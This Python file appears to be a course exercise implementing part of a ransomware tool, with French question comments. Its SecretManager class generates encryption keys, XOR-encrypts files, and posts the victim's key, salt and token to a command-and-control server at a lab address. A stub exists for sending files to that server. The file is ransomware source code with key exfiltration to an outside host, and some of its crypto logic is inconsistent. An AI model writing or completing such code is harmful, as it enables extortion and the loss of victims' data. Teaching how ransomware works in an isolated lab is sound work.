from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._files_encrypted = {}
        self.filter = "*.txt"

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # Salt derivation
        salt_derivation = PBKDF2HMAC(algorithm=hashes.SHA256(),
                        length=self.SALT_LENGTH,
                        salt=secrets.token_bytes(16),
                        iterations=self.ITERATION)

        salt = salt_derivation.derive(salt)

        # Key derivation
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),
                        length=self.KEY_LENGTH,
                        salt=salt,
                        iterations=self.ITERATION)

        return kdf.derive(key), salt

        # Other way to do it with secret library
        # return secrets.token_bytes(16)

        #########################
        # Question 2. 
        # #######################
        # Il existe des dictionnaires faisant le liens avec les hashes 
        # Il faut au moins du pseudo aléatoire?
        # Le salt est stocké en local
        

    def create(self)-> dict: # Tuple[bytes, bytes, bytes]:
        res = {
            "key": secrets.token_bytes(16),
            "salt": secrets.token_bytes(16),
            "token": secrets.token_bytes(16)
            }

        self._token= res["token"]
        return res

    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        payload = {
            "token" : self.bin_to_b64(token),
            "salt"  : self.bin_to_b64(salt),
            "key"   : self.bin_to_b64(key)
        }
        requests.post("http://172.19.0.2:6666/new", json=payload)
        #sudo docker inspect ransomware-network
    
        return {}

    def setup(self)->None:

        tokens = self.create()

        key, salt = self.do_derivation(tokens["salt"], tokens["key"])
        token = tokens["token"]
        self._key = key
        #m = sha256()
        #m.update(token)
        #TOKEN = str(m.hexdigest())
        folder_token_name = "/root/token"

        os.makedirs(folder_token_name, exist_ok=True)

        with open(folder_token_name + "/token.bin", "wb") as f:
            f.write(token)

        with open(folder_token_name + "/salt.bin", "wb") as f:
            f.write(salt)

        self.post_new(salt, key, tokens["token"])

        #################
        # Question 3 
        #################
        # Eviter d'ecrire dans un 
        # fichier contenant déjà qqc et 
        # de perdre ainsi le token

    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token

        return self._token.hex()

    def xorfiles(self, files:List[str])->None:
        # xor a list for file

        for file in files:
            self._files_encrypted[str(file)] = xorfile(file, self._key)
        
        
    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        self._key = secrets.token_bytes(16)
        self._key = None

if __name__=="__main__":
    secret_manager = SecretManager()
    secret_manager.setup()
